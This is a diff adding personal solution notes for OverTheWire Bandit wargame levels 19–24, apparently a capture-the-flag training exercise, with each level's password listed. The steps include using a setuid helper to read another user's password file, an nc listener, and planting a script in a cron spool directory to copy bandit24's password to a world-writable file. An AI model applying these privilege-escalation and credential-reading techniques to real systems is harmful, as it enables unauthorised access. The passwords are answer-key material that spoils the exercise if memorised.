@@ -153,3 +153,40 @@ bandit18-bandit19: [
             [Before logging in => ssh bandit18@bandit.labs.overthewire.org -p 2220 -t "/bin/dash"]
             cat readme
 ] => cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
+
+bandit19-bandit20: [
+    Steps:
+        ./bandit20-do cat /etc/bandit_pass/bandit20
+] => 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+
+bandit20-bandit21: [
+    Steps:
+        echo 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO | nc -l 8082 &
+        ./suconnect  8082
+] => EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+
+bandit21-bandit22: [
+    Steps:
+        cat /etc/cron.d/cronjob_bandit22
+        cat /usr/bin/cronjob_bandit22.sh
+        cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+] => tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+
+bandit22-bandit23: [
+    Steps:
+        cat /etc/cron.d/cronjob_bandit23
+        cat /usr/bin/cronjob_bandit23.sh
+        cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+] => 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+
+bandit23-bandit24: [
+    Steps:
+        cat /etc/cron.d/cronjob_bandit24
+        cat /usr/bin/cronjob_bandit24.sh
+        touch /tmp/tempfile
+        chmod o+w /tmp/tempfile
+        echo "cat /etc/bandit_pass/bandit24 > /tmp/tempfile"  > /var/spool/bandit24/foo/script.sh
+        chmod o+x /var/spool/bandit24/foo/script.sh
+        [Wait 60 seconds or less]
+        /tmp/tempfile
+] => gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
